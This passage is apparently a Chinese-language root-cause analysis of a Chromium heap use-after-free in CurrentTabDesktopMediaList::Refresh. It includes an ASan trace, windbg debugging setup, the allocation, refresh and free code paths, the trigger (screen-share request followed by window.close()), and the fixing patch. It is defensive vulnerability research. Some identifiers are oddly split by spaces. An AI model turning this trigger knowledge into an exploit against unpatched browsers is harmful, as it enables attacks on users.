    #33 0x55944c688845 in content::ContentMainRunnerImpl::RunBrowser(content::MainFunctionParams&, bool) content/app/content_main_runner_impl.cc:1067:10
    #34 0x55944c687bb7 in content::ContentMainRunnerImpl::Run(bool) content/app/content_main_runner_impl.cc:945:12
    #35 0x55944c682076 in content::RunContentProcess(content::ContentMainParams const&, content::ContentMainRunner*) content/app/content_main.cc:372:36
    #36 0x55944c6825cc in content::ContentMain(content::ContentMainParams const&) content/app/content_main.cc:398:10

previously allocated by thread T0 (chrome) here:
    #0 0x5594401cfded in operator new(unsigned long) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_new_delete.cpp:99:3
    #1 0x5594461b017c in content::WebContentsViewAura::CreateViewForWidget(content::RenderWidgetHost*) content/browser/web_contents/web_contents_view_aura.cc:945:13
    #2 0x55944618eeac in content::WebContentsImpl::CreateRenderWidgetHostViewForRenderManager(content::RenderViewHost*) content/browser/web_contents/web_contents_impl.cc:7631:14
    #3 0x55944618f6b3 in content::WebContentsImpl::CreateRenderViewForRenderManager(content::RenderViewHost*, B ase::Optional<b l ink::MultiToken<util::TokenType<b l ink::LocalF rameTokenTypeMarker>, util::TokenType<b l ink::RemoteF rameTokenTypeMarker> > > const&, content::RenderF rameProxyHost*) content/browser/web_contents/web_contents_impl.cc:7654:5
    #4 0x559445c9608d in InitRenderView content/browser/renderer_host/render_F rame_host_manager.cc:2688:29
    #5 0x559445c9608d in content::RenderF rameHostManager::ReinitializeMainRenderF rame(content::RenderF rameHostImpl*) content/browser/renderer_host/render_F rame_host_manager.cc:2905:8
    #6 0x559445c94272 in content::RenderF rameHostManager::GetF rameHostForNavigation(content::NavigationRequest*, std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >*) content/browser/renderer_host/render_F rame_host_manager.cc:948:10
    #7 0x559445c931dc in content::RenderF rameHostManager::DidCreateNavigationRequest(content::NavigationRequest*) content/browser/renderer_host/render_F rame_host_manager.cc:722:37
    #8 0x5594459c2979 in content::F rameTreeNode::CreatedNavigationRequest(std::__1::unique_ptr<content::NavigationRequest, std::__1::default_delete<content::NavigationRequest> >) content/browser/renderer_host/F rame_tree_node.cc:517:21
    #9 0x559445bbd12d in content::Navigator::Navigate(std::__1::unique_ptr<content::NavigationRequest, std::__1::default_delete<content::NavigationRequest> >, content::ReloadType) content/browser/renderer_host/navigator.cc:540:20
    #10 0x559445b208ac in content::NavigationControllerImpl::NavigateWithoutEntry(content::NavigationController::LoadURLParams const&) content/browser/renderer_host/navigation_controller_impl.cc:3168:21
    #11 0x559445b1fef4 in content::NavigationControllerImpl::LoadURLWithParams(content::NavigationController::LoadURLParams const&) content/browser/renderer_host/navigation_controller_impl.cc:1042:3
    #12 0x559457a2534d in (anonymous namespace)::LoadURLInContents(content::WebContents*, GURL const&, NavigateParams*) chrome/browser/ui/browser_navigator.cc:385:36
    #13 0x559457a22c13 in Navigate(NavigateParams*) chrome/browser/ui/browser_navigator.cc:660:7
    #14 0x559457b18f64 in StartupBrowserCreatorImpl::OpenTabsInBrowser(Browser*, bool, std::__1::vector<StartupTab, std::__1::allocator<StartupTab> > const&) chrome/browser/ui/startup/startup_browser_creator_impl.cc:273:5
    #15 0x559457b1b5a7 in StartupBrowserCreatorImpl::RestoreOrCreateBrowser(std::__1::vector<StartupTab, std::__1::allocator<StartupTab> > const&, StartupBrowserCreatorImpl::BrowserOpenBehavior, unsigned int, bool, bool) chrome/browser/ui/startup/startup_browser_creator_impl.cc:521:13
    #16 0x559457b180ee in StartupBrowserCreatorImpl::DetermineURLsAndLaunch(bool, std::__1::vector<GURL, std::__1::allocator<GURL> > const&) chrome/browser/ui/startup/startup_browser_creator_impl.cc:385:22
    #17 0x559457b174d1 in StartupBrowserCreatorImpl::Launch(Profile*, std::__1::vector<GURL, std::__1::allocator<GURL> > const&, bool, std::__1::unique_ptr<LaunchModeRecorder, std::__1::default_delete<LaunchModeRecorder> >) chrome/browser/ui/startup/startup_browser_creator_impl.cc:186:3
    #18 0x559457b0b3b8 in StartupBrowserCreator::LaunchBrowser(B ase::CommandLine const&, Profile*, B ase::FilePath const&, chrome::startup::IsProcessStartup, chrome::startup::IsFirstRun, std::__1::unique_ptr<LaunchModeRecorder, std::__1::default_delete<LaunchModeRecorder> >) chrome/browser/ui/startup/startup_browser_creator.cc:573:13
    #19 0x559457b1310d in StartupBrowserCreator::ProcessLastOpenedProfiles(B ase::CommandLine const&, B ase::FilePath const&, chrome::startup::IsProcessStartup, chrome::startup::IsFirstRun, Profile*, std::__1::vector<Profile*, std::__1::allocator<Profile*> > const&) chrome/browser/ui/startup/startup_browser_creator.cc:1115:10
    #20 0x559457b12a72 in StartupBrowserCreator::LaunchBrowserForLastProfiles(B ase::CommandLine const&, B ase::FilePath const&, bool, Profile*, std::__1::vector<Profile*, std::__1::allocator<Profile*> > const&) chrome/browser/ui/startup/startup_browser_creator.cc:1065:10
    #21 0x559457b0a8aa in StartupBrowserCreator::ProcessCmdLineImpl(B ase::CommandLine const&, B ase::FilePath const&, bool, Profile*, std::__1::vector<Profile*, std::__1::allocator<Profile*> > const&) chrome/browser/ui/startup/startup_browser_creator.cc:984:10
    #22 0x559457b08ae2 in StartupBrowserCreator::Start(B ase::CommandLine const&, B ase::FilePath const&, Profile*, std::__1::vector<Profile*, std::__1::allocator<Profile*> > const&) chrome/browser/ui/startup/startup_browser_creator.cc:525:10
    #23 0x55944d40567a in ChromeBrowserMainParts::PreMainMessageLoopRunImpl() chrome/browser/chrome_browser_main.cc:1648:25
    #24 0x55944d403624 in ChromeBrowserMainParts::PreMainMessageLoopRun() chrome/browser/chrome_browser_main.cc:1043:18
    #25 0x559445001cf1 in content::BrowserMainLoop::PreMainMessageLoopRun() content/browser/browser_main_loop.cc:952:13
    #26 0x55944604e7f8 in Run B ase/callback.h:101:12
    #27 0x55944604e7f8 in content::StartupTaskRunner::RunAllTasksNow() content/browser/startup_task_runner.cc:41:29
    #28 0x559444fff1e2 in content::BrowserMainLoop::CreateStartupTasks() content/browser/browser_main_loop.cc:862:25
    #29 0x55944500667a in content::BrowserMainRunnerImpl::Initialize(content::MainFunctionParams const&) content/browser/browser_main_runner_impl.cc:129:15
    #30 0x559444ffb345 in content::BrowserMain(content::MainFunctionParams const&) content/browser/browser_main.cc:43:32
    #31 0x55944c688845 in RunBrowserProcessMain content/app/content_main_runner_impl.cc:582:10
    #32 0x55944c688845 in content::ContentMainRunnerImpl::RunBrowser(content::MainFunctionParams&, bool) content/app/content_main_runner_impl.cc:1067:10

SUMMARY: AddressSanitizer: heap-use-after-free chrome/browser/media/webrtc/current_tab_desktop_media_list.cc:123:10 in CurrentTabDesktopMediaList::Refresh(bool)
Shadow bytes around the buggy address:
  0x0c3680018be0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3680018bf0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3680018c00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3680018c10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3680018c20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c3680018c30:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3680018c40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3680018c50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3680018c60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3680018c70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3680018c80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra o bject redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==188105==ABORTING

```

调试环境搭建
------

### 可执行程序和符号获取

在 <https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html> 下载 win64 861450 版本 chromium，其中 Win\_x64\_861450\_chrome-win.zip 为可执行程序，Win\_x64\_861450\_chrome-win32-syms.zip 为对应的符号文件。下载这两个 zip ，然后解压。

### 源码准备

按照 [Checking out and Building Chromium for Windows](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/windows_build_instructions.md) 下载 chromium 源码，然后使用`git checkout`检出到 861450 对应的 commit，commit 编号在上节下载 zip 包的网页上找到。

### 加载可执行程序

先用 python 搭建一个简单的 HTTP 服务器，然后使用 windbg 加载 chromium 同进指定参数，如下所示：

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-43c1d91df78b15820a5479b1d83271230f8fd7cb.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-43c1d91df78b15820a5479b1d83271230f8fd7cb.png)

点击 File - Symbol File Path，添加对应符号目录，如下所示：

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-af323c8131bc08c56a3198194c6145bca52b43f4.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-af323c8131bc08c56a3198194c6145bca52b43f4.png)

点击 File - Source File Path，添加源码对应目录，如下所示：

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-22efa72e68b3b9a3f2fd210f7f142f3d73ff4c9f.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-22efa72e68b3b9a3f2fd210f7f142f3d73ff4c9f.png)

由于 chrome 的主要功能实现在 chrome.dll 中，而此时该 dll 还没有被加载，使用`sxe ld chrome`告诉 windbg，在加载完 chrome.dll 后中断，输入g运行程序，等待程序中断，使用`lm`命令确认 chrome.dll 是否已经加载：

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-e2d83be002a7cd39a7d1969a97f9c55e2f407c80.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-e2d83be002a7cd39a7d1969a97f9c55e2f407c80.png)

在 chrome.dll 加载完成后就可以使用`.reload /f chrome.dll`命令加载 chrome.dll 的符号，如下图所示：

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c0ed4e7c99daf2fb8628370423f170419f9c5cb6.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c0ed4e7c99daf2fb8628370423f170419f9c5cb6.png)

下面出现的警告可以不用理会。加载完符号后就可以进行带源码的调试，如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3c1318b9a5aad266897cd25e792a497f6e942dd3.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3c1318b9a5aad266897cd25e792a497f6e942dd3.png)

UAF 对象相关操作
----------

### 对象创建

在浏览器收到请求后由 `content::RenderF rameHostManager::InitRenderView` 创建一个 RenderView，并在 RenderView 中创建 RenderWidget 如下：

```cpp
// content\browser\renderer_host\render_F rame_host_manager.cc
bool RenderF rameHostManager::InitRenderView(
    SiteInstance* site_instance,
    RenderViewHostImpl* render_view_host,
    RenderF rameProxyHost* proxy) {
// ---snip---
  bool created = delegate_->CreateRenderViewForRenderManager(
      render_view_host, opener_F rame_token, proxy);

// ---snip---
}
```

该函数会调用 `web_contents_impl` 类中的函数创建 RenderView ：

```cpp
// content\browser\web_contents\web_contents_impl.cc
bool WebContentsImpl::CreateRenderViewForRenderManager(
    RenderViewHost* render_view_host,
    const B ase::Optional<b l ink::F rameToken>& opener_F rame_token,
    RenderF rameProxyHost* proxy_host) {
// ---snip---
  if (!proxy_host)
    CreateRenderWidgetHostViewForRenderManager(render_view_host);
// ---snip---
}

void WebContentsImpl::CreateRenderWidgetHostViewForRenderManager(
    RenderViewHost* render_view_host) {
// ---snip---
  RenderWidgetHostViewB ase* rwh_view =
      view_->CreateViewForWidget(render_view_host->GetWidget());
// ---snip---
}
```

最后调用 `web_contents_view_aura` 类创建一个`RenderWidgetHostViewAura`对象

```cpp
// content\browser\web_contents\web_contents_view_aura.cc
RenderWidgetHostViewB ase* WebContentsViewAura::CreateViewForWidget(
    RenderWidgetHost* render_widget_host) {
// ---snip---
  RenderWidgetHostViewAura* view =
      g_create_render_widget_host_view
          ? g_create_render_widget_host_view(render_widget_host)
          : new RenderWidgetHostViewAura(render_widget_host);
// ---sinp---
}
```

此时就会创建一个`RenderWidgetHostViewAura`对象，而在`RenderWidgetHostViewAura`的初始化函数中，会调用相关函数，将`view_`变量设置为自身，如下所示：

```cpp
RenderWidgetHostViewAura::RenderWidgetHostViewAura(
    RenderWidgetHost* widget_host)
    : RenderWidgetHostViewB ase(widget_host),
      window_(nullptr),
      in_shutdown_(false),
      in_bounds_changed_(false),
      popup_parent_host_view_(nullptr),
      popup_child_host_view_(nullptr),
      is_loading_(false),
      has_composition_text_(false),
      added_F rame_observer_(false),
      cursor_visibility_state_in_renderer_(UNKNOWN),
#if defined(OS_WIN)
      legacy_render_widget_host_HWND_(nullptr),
      legacy_window_destroyed_(false),
#endif
      device_scale_factor_(0.0f),
      event_handler_(new RenderWidgetHostViewEventHandler(host(), this, this)),
      F rame_sink_id_(host()->GetF rameSinkId()) {
//---snip---
  host()->SetView(this);
//---snip---
}
```

上段代码会调用到`RenderWidgetHostImpl`类的`SetView`函数，将`view_`成员变量设置为传入的`this`指针：

```cpp
void RenderWidgetHostImpl::SetView(RenderWidgetHostViewB ase* view) {
  synthetic_gesture_controller_.reset();

  if (view) {
    view_ = view->GetWeakPtr();
    if (!create_F rame_sink_callback_.is_null())
      std::move(create_F rame_sink_callback_).Run(view_->GetF rameSinkId());
//---snip---
  } else {
    view_.reset();
  }
}
```

在 poc 代码中会请求共享当前屏幕的内容，此时需要用户授权，请求授权过程如下：

```cpp
//content/browser/render_host/media/media_stream_ui_proxy.cc
void MediaStreamUIProxy::Core::RequestAccess(
    std::unique_ptr<MediaStreamRequest> request) {
// ---snip---
  render_delegate->RequestMediaAccessPermission(
      *request,
      B ase::BindOnce(&Core::ProcessAccessRequestResponse,
                     weak_factory_.GetWeakPtr(), request->render_process_id,
                     request->render_F rame_id));
}
//content/browser/web_contents/web_contents_impl.cc
void WebContentsImpl::RequestMediaAccessPermission(
    const MediaStreamRequest& request,
    MediaResponseCallback callback) {
//---snip---
  if (delegate_) {
    delegate_->RequestMediaAccessPermission(this, request, std::move(callback));
  }
//---snip---
}
//content/browser/ui/browser.cc
void Browser::RequestMediaAccessPermission(
    content::WebContents* web_contents,
    const content::MediaStreamRequest& request,
    content::MediaResponseCallback callback) {
//---snip---
      handler->HandleRequest(web_contents, request, std::move(callback),
                             extension);
//---snip---
}
//content/browser/media/webrtc/display_media+access_handler.cc
void DisplayMediaAccessHandler::HandleRequest(
    content::WebContents* web_contents,
    const content::MediaStreamRequest& request,
    content::MediaResponseCallback callback,
    const extensions::Extension* extension) {
//---snip---
  RequestsQueue& queue = pending_requests_[web_contents];

  queue.push_back(std::make_unique<PendingAccessRequest>(
      std::move(picker), request, std::move(callback)));
  // If this is the only request then pop picker UI.
  if (queue.size() == 1)
    ProcessQueuedAccessRequest(queue, web_contents);
}

void DisplayMediaAccessHandler::ProcessQueuedAccessRequest(
    const RequestsQueue& queue,
    content::WebContents* web_contents) {
//---snip---
  auto source_lists =
      picker_factory_->CreateMediaList(media_types, web_contents);
//---snip---
}
//content/browser/media/webrtc/desktop_media_picker_factory_impl.cc
std::vector<std::unique_ptr<DesktopMediaList>>
DesktopMediaPickerFactoryImpl::CreateMediaList(
    const std::vector<DesktopMediaList::Type>& types,
    content::WebContents* web_contents) {
//---snip---
        source_lists.push_back(
            std::make_unique<CurrentTabDesktopMediaList>(web_contents));
//---snip---
}
//content/browser/media/webrtc/current_tab_desktop_media_list.cc
CurrentTabDesktopMediaList ::CurrentTabDesktopMediaList(
    content::WebContents* web_contents)
    : CurrentTabDesktopMediaList(web_contents, kUpdatePeriodMs, nullptr) {}

CurrentTabDesktopMediaList::CurrentTabDesktopMediaList(
    content::WebContents* web_contents,
    B ase::TimeDelta period,
    DesktopMediaListObserver* observer)
    : DesktopMediaListB ase(period),
      view_(web_contents->GetRenderWidgetHostView()),
      media_id_(content::DesktopMediaID::TYPE_WEB_CONTENTS,
                content::DesktopMediaID::kNullId,
                content::WebContentsMediaCaptureId(
                    web_contents->GetMainF rame()->GetProcess()->GetID(),
                    web_contents->GetMainF rame()->GetRoutingID())),
      thumbnail_task_runner_(B ase::ThreadPool::CreateSequencedTaskRunner(
          {B ase::MayBlock(), B ase::TaskPriority::USER_VISIBLE})) {
//---snip---
}
//content/browser/media/webrtc/desktop_media_list_B ase.cc
DesktopMediaListB ase::DesktopMediaListB ase(B ase::TimeDelta update_period)
    : update_period_(update_period) {}
```

在 `CurrentTabDesktopMediaList` 类的构造函数中，将`view_`的值初始化为 `web_contents->GetRenderWidgetHostView()`将`RenderWidgetHostView`进行缓存，，然后设置重绘时间为`kUpdatePeriodMs`(1000000i64)。`view_`获取过程如下：

```cpp
//content/browser/web_contents/web_contents_impl.cc
RenderWidgetHostView* WebContentsImpl::GetRenderWidgetHostView() {
  return GetRenderManager()->GetRenderWidgetHostView();
}
//content/browser/renderer_host/render_F rame_host_manager.cc
RenderWidgetHostView* RenderF rameHostManager::GetRenderWidgetHostView() const {
  if (render_F rame_host_)
    return render_F rame_host_->GetView();
  return nullptr;
}
//content/browser/renderer_host/render_widget_host_impl.cc
RenderWidgetHostViewB ase* RenderWidgetHostImpl::GetView() {
  return view_.get();
}
```

上面的代码最终获取`RenderWidgetHostImpl`类的`view_`变量，这正是上一步创建的`RenderWidgetHostViewAura`对象。

### 页面更新

在 ProcessQueuedAccessRequest 函数创建 MediaList 后，会调用 show 函数，显示授权弹出窗口，如下所示：

```cpp
//chrome/browser/ui/views/desktop_capture/desktop_picker_views.cc
void DisplayMediaAccessHandler::ProcessQueuedAccessRequest(
    const RequestsQueue& queue,
    content::WebContents* web_contents) {
//---snip---
  auto source_lists =
      picker_factory_->CreateMediaList(media_types, web_contents);
//---snip---
  pending_request.picker->Show(picker_params, std::move(source_lists),
                               std::move(done_callback));
}
//chrome/browser/ui/views/desktop_capture/desktop_media_picker_views.cc
DesktopMediaPickerDialogView::DesktopMediaPickerDialogView(
    const DesktopMediaPicker::Params& params,
    DesktopMediaPickerViews* parent,
    std::vector<std::unique_ptr<DesktopMediaList>> source_lists)
    : web_contents_(params.web_contents), parent_(parent) {
//---snip---
  for (const auto& list_controller : list_controllers_)
    list_controller->StartUpdating(dialog_window_id);
}
//chrome/browser/ui/views/desktop_capture/desktop_media_list_controller.cc
void DesktopMediaListController::StartUpdating(
    content::DesktopMediaID dialog_window_id) {
  media_list_->SetViewDialogWindowId(dialog_window_id);
  media_list_->StartUpdating(this);
}
//chrome/browser/media/webrtc/desktop_media_list_B ase.cc
void DesktopMediaListB ase::StartUpdating(DesktopMediaListObserver* observer) {
  DCHECK(!observer_);
  observer_ = observer;

  // Process sources previously discovered by a call to Update().
  if (observer_) {
    for (size_t i = 0; i < sources_.size(); i++) {
      observer_->OnSourceAdded(this, i);
    }
  }

  DCHECK(!refresh_callback_);
  refresh_callback_ = B ase::BindOnce(&DesktopMediaListB ase::ScheduleNextRefresh,
                                     weak_factory_.GetWeakPtr());
  Refresh(true);
}
```

在`StartUpdating`函数中调用了将`refresh_callback_`成员变量与`DesktopMediaListB ase::ScheduleNextRefresh`函数进行绑定，然后调用了`refresh`函数，该函数如下：

```cpp
//chrome/browser/media/webrtc/current_tab_desktop_media_list.cc
void CurrentTabDesktopMediaList::Refresh(bool update_thumnails) {
  DCHECK_CURRENTLY_ON(content::BrowserThread::UI);
  DCHECK(can_refresh());

  if (refresh_in_progress_ || !update_thumnails || thumbnail_size_.IsEmpty()) {
    return;
  }

  refresh_in_progress_ = true;

  auto reply = B ase::BindOnce(&CurrentTabDesktopMediaList::OnCaptureHandled,
                              weak_factory_.GetWeakPtr());

  view_->CopyFromSurface(
      gfx::Rect(), gfx::Size(),
      B ase::BindPostTask(thumbnail_task_runner_,
                         B ase::BindOnce(&HandleCapturedBitmap, std::move(reply),
                                        last_hash_, thumbnail_size_)));
}
```

在`Refresh`函数中，将`reply`与`OncaptureHandled`函数进行绑定，然后作为参数传入`CopyFromSurface`函数，因此该函数会调用`OnCaptureHandled`函数返回结果，而在`OnCaptureHandled`函数中，又会调用`OnRefreshComplete`函数，最后通过`refresh_callback_`调用`DesktopMediaListB ase::ScheduleNextRefresh`函数，如下所示：

```cpp
//chrome/browser/media/webrtc/current_tab_desktop_media_list.cc
void CurrentTabDesktopMediaList::OnCaptureHandled(
    uint32_t hash,
    const B ase::Optional<gfx::ImageSkia>& image) {
  DCHECK_CURRENTLY_ON(content::BrowserThread::UI);
  DCHECK((hash != last_hash_) == image.has_value());  // Only new F rames passed.

  refresh_in_progress_ = false;

  if (hash != last_hash_) {
    last_hash_ = hash;
    UpdateSourceThumbnail(media_id_, image.value());
  }

  OnRefreshComplete();
}
//chrome/browser/media/webrtc/desktop_media_list_B ase.cc
void DesktopMediaListB ase::OnRefreshComplete() {
  DCHECK(refresh_callback_);
  std::move(refresh_callback_).Run();
}
```

在`ScheduleNextRefresh`函数中会将`refresh_callback_`成员变量再次与自身进行绑定，然后发布一个延时任务调用`Refresh`函数，形成一个循环，从而不停的对窗体进行刷新：

```cpp
//chrome/browser/media/webrtc/desktop_media_list_B ase.cc
void DesktopMediaListB ase::ScheduleNextRefresh() {
  DCHECK(!refresh_callback_);
  refresh_callback_ = B ase::BindOnce(&DesktopMediaListB ase::ScheduleNextRefresh,
                                     weak_factory_.GetWeakPtr());
  content::GetUIThreadTaskRunner({})->PostDelayedTask(
      FROM_HERE,
      B ase::BindOnce(&DesktopMediaListB ase::Refresh, weak_factory_.GetWeakPtr(),
                     true),
      update_period_);
}
```

### 对象释放

在 poc 调用 `windows.close()` 函数后，tab 被关闭，此时会释放一系列的对象，包括前面分配的`RenderF rameHostManager`对象。关闭窗口的消息在经过 mojo 相关组件分发后会调用 `content::WebContentsImpl::Close`函数，如下所示：

```cpp
// content/browser/web_contents/web_contents_impl.cc
void WebContentsImpl::Close(RenderViewHost* rvh) {
//---snip---
  // Ignore this if it comes from a RenderViewHost that we aren't showing.
  if (delegate_ && rvh == GetRenderViewHost())
    delegate_->CloseContents(this);
}
//chrome/browser/ui/browser.cc
void Browser::CloseContents(WebContents* source) {
  if (unload_controller_.CanCloseContents(source))
    chrome::CloseWebContents(this, source, true);
}
//chrome/browser/ui/browser_tabstrip.cc
void CloseWebContents(Browser* browser,
                      content::WebContents* contents,
                      bool add_to_history) {
  int index = browser->tab_strip_model()->GetIndexOfWebContents(contents);
  if (index == TabStripModel::kNoTab) {
    NOTREACHED() << "CloseWebContents called for tab not in our strip";
    return;
  }

  browser->tab_strip_model()->CloseWebContentsAt(
      index, add_to_history ? TabStripModel::CLOSE_CREATE_HISTORICAL_TAB
                            : TabStripModel::CLOSE_NONE);
}
//chrome/browser/ui/browser.cc
void Browser::CloseContents(WebContents* source) {
  if (unload_controller_.CanCloseContents(source))
    chrome::CloseWebContents(this, source, true);
}
//chrome/browser/ui/browser_tabstrip.cc
void CloseWebContents(Browser* browser,
                      content::WebContents* contents,
                      bool add_to_history) {
  int index = browser->tab_strip_model()->GetIndexOfWebContents(contents);
  if (index == TabStripModel::kNoTab) {
    NOTREACHED() << "CloseWebContents called for tab not in our strip";
    return;
  }

  browser->tab_strip_model()->CloseWebContentsAt(
      index, add_to_history ? TabStripModel::CLOSE_CREATE_HISTORICAL_TAB
                            : TabStripModel::CLOSE_NONE);
}
//chrome/browser/ui/tabs/tab_strip_model.cc
bool TabStripModel::CloseWebContentsAt(int index, uint32_t close_types) {
  DCHECK(ContainsIndex(index));
  WebContents* contents = GetWebContentsAt(index);
  return InternalCloseTabs(B ase::span<WebContents* const>(&contents, 1),
                           close_types);
}

bool TabStripModel::InternalCloseTabs(
    B ase::span<content::WebContents* const> items,
    uint32_t close_types) {
//--snip---
  const bool closed_all =
      CloseWebContentses(items, close_types, &notifications);
//---snip---
}

bool TabStripModel::CloseWebContentses(
    B ase::span<content::WebContents* const> items,
    uint32_t close_types,
    DetachNotifications* notifications) {
//---snip---
  if (!browser_shutdown::HasShutdownStarted()) {
    // Construct a map of processes to the number of associated tabs that are
    // closing.
    B ase::flat_map<content::RenderProcessHost*, size_t> processes;
    for (content::WebContents* contents : items) {
      if (ShouldRunUnloadListenerBeforeClosing(contents))
        continue;
      content::RenderProcessHost* process =
          contents->GetMainF rame()->GetProcess();
      ++processes[process];
    }
    // Try to fast shutdown the tabs that can close.
    for (const auto& pair : processes)
      pair.first->FastShutdownIfPossible(pair.second, false);
  }
//---snip---
}
```

`CloseWebContentses`尝试调用 fast shutdown 关闭相关 tabs：

```cpp
//content/browser/renderer_host/render_process_host_impl.cc
bool RenderProcessHostImpl::FastShutdownIfPossible(size_t page_count,
                                                   bool skip_unload_handlers) {
//---snip---
  ProcessDied(false /* already_dead */, nullptr);
//---snip---
}

void RenderProcessHostImpl::ProcessDied(
    bool already_dead,
    ChildProcessTerminationInfo* known_info) {
//---snip---
  for (auto& observer : observers_)
    observer.RenderProcessExited(this, info);
//---snip---
}
//content/browser/renderer_host/render_view_host_impl.cc
void RenderViewHostImpl::RenderProcessExited(
    RenderProcessHost* host,
    const ChildProcessTerminationInfo& info) {
  renderer_view_created_ = false;
  GetWidget()->RendererExited();
  delegate_->RenderViewTerminated(this, info.status, info.exit_code);
  // |this| might have been deleted. Do not add code here.
}
//content/browser/renderer_host/render_widget_host_impl.cc
void RenderWidgetHostImpl::RendererExited() {
//---snip---
  if (view_) {
    view_->RenderProcessGone();
    SetView(nullptr);  // The View should be deleted by RenderProcessGone.
  }
}
//content/browser/renderer_host/render_widget_host_view_aura.cc
void RenderWidgetHostViewAura::RenderProcessGone() {
  UpdateCursorIfOverSelf();
  Destroy();
}
void RenderWidgetHostViewAura::Destroy() {
//---snip---
  in_shutdown_ = true;
  if (window_)
    delete window_;
  else
    delete this;
}
```

通过以上调用链将 window\_ 对象删除。

UAF
---

通过 UAF 对象的分配、释放和缓存过程可以看出，如果在队列中还存在重绘任务时调用相关函数将 RenderWidgetHostViewAura 对象释放掉后，在下一次调用 Refersh 函数时会对缓存的 RenderWidgetHostViewAura 指针进行解引用，而该对象已经被释放，因此会触发 UAF。

漏洞修补
----

避免在创建`CurrentTabDesktopMediaList`时缓存`RenderWidgetHostView`，在需要使用该对象时通过`content::RenderF rameHost::FromID`和`content::RenderWidgetHostView`获取，当 view 对象被释放后，返回的是一个空指针，因此避免了 UAF。如下：

```diff
--- a/chrome/browser/media/webrtc/current_tab_desktop_media_list.cc
+++ b/chrome/browser/media/webrtc/current_tab_desktop_media_list.cc
@@ -84,7 +84,6 @@
     B ase::TimeDelta period,
     DesktopMediaListObserver* observer)
     : DesktopMediaListB ase(period),
-      view_(web_contents->GetRenderWidgetHostView()),
       media_id_(content::DesktopMediaID::TYPE_WEB_CONTENTS,
                 content::DesktopMediaID::kNullId,
                 content::WebContentsMediaCaptureId(
@@ -93,7 +92,6 @@
       thumbnail_task_runner_(B ase::ThreadPool::CreateSequencedTaskRunner(
           {B ase::MayBlock(), B ase::TaskPriority::USER_VISIBLE})) {
   DCHECK(web_contents);
-  DCHECK(view_);

   type_ = DesktopMediaList::Type::kCurrentTab;

@@ -107,11 +105,23 @@

 CurrentTabDesktopMediaList::~CurrentTabDesktopMediaList() = default;

-void CurrentTabDesktopMediaList::Refresh(bool update_thumnails) {
+void CurrentTabDesktopMediaList::Refresh(bool update_thumbnails) {
   DCHECK_CURRENTLY_ON(content::BrowserThread::UI);
   DCHECK(can_refresh());

-  if (refresh_in_progress_ || !update_thumnails || thumbnail_size_.IsEmpty()) {
+  if (refresh_in_progress_ || !update_thumbnails || thumbnail_size_.IsEmpty()) {
+    return;
+  }
+
+  content::RenderF rameHost* const host = content::RenderF rameHost::FromID(
+      media_id_.web_contents_id.render_process_id,
+      media_id_.web_contents_id.main_render_F rame_id);
+  if (!host) {
+    return;
+  }
+
+  content::RenderWidgetHostView* const view = host->GetView();
+  if (!view) {
     return;
   }

@@ -120,7 +130,7 @@
   auto reply = B ase::BindOnce(&CurrentTabDesktopMediaList::OnCaptureHandled,
                               weak_factory_.GetWeakPtr());

-  view_->CopyFromSurface(
+  view->CopyFromSurface(
       gfx::Rect(), gfx::Size(),
       B ase::BindPostTask(thumbnail_task_runner_,
                          B ase::BindOnce(&HandleCapturedBitmap, std::move(reply),
```

```diff
--- a/chrome/browser/media/webrtc/current_tab_desktop_media_list.h
+++ b/chrome/browser/media/webrtc/current_tab_desktop_media_list.h
@@ -23,7 +23,7 @@
                              B ase::TimeDelta period,
                              DesktopMediaListObserver* observer);

-  void Refresh(bool update_thumnails) override;
+  void Refresh(bool update_thumbnails) override;

   // Called on the UI thread after the captured image is handled. If the
   // image was new, it's rescaled to the desired size and sent back in |image|.
@@ -38,7 +38,6 @@
   void ResetLastHashForTesting();

   // This "list" tracks a single view - the one represented by these variables.
-  content::RenderWidgetHostView* const view_;
   const content::DesktopMediaID media_id_;

   // Avoid two concurrent refreshes.
```